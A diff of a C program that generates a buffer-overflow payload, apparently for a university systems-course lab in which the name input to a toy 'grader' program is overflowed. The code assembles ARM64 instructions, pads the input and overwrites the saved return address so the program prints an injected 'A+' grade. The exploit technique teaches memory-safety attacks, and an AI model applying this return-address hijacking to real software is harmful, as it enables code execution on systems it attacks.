@@ -4,11 +4,11 @@
 
 int main(void) {
     char pcInject[48];
-    char pcName[] = "Angeline Yan and Jade Sceats";
+    char pcName[] = "Ang & Jade";
     int iNameLength;
     int i;
     unsigned long uiTargetAddr = 0x400890;
-    unsigned int uiAdr, uiMov, uiStrh, uiB;
+    unsigned int uiAdr, uiB;
     FILE *psFile;
 
     /* get name(s) to use in dataA */
@@ -26,22 +26,17 @@ int main(void) {
     /* write name */
     fwrite(pcInject, sizeof(char), iNameLength, psFile);
     /* write instructions */
-    /* load grade instr (0x420044 is addr of grade, 0x420058 + i is addr
-    of this instruction) */
-    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420058 + iNameLength);
+    /* put address of new A+ string in reg 0 */
+    uiAdr = MiniAssembler_adr(0, 0x420071, 0x420068);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
-    /* get "A" instr */
-    uiMov = MiniAssembler_mov(1, 0x412B);
-    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
-    /* set "A" instr */
-    uiStrh = MiniAssembler_strh(1, 0);
-    fwrite(&uiStrh, sizeof(unsigned int), 1, psFile);
-    i = iNameLength + 12;
-    /* branch to print instr (0x40089c is addr of print instr in main,
-    0x420058 + i is addr of this instr) */
-    uiB = MiniAssembler_b(0x40089c, 0x420058 + i);
+    i = iNameLength + 4;
+    /* branch to print instr (0x4008ac is addr of print instr in main,
+    0x42006c is addr of this instr) */
+    uiB = MiniAssembler_b(0x4008ac, 0x42006c);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
     i = i + 4;
+    fprintf(psFile, "%s", "A+ is your grade.\n");
+    i = i + 19;
 
     /* pad as necessary */
     for (; i < 48; i++) {
@@ -49,7 +44,7 @@ int main(void) {
     }
 
     /* overwrite getName's x30 with addr of inject code in bss */
-    uiTargetAddr = 0x420058 + iNameLength;
+    uiTargetAddr = 0x420068;
     fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
     fclose(psFile);
 
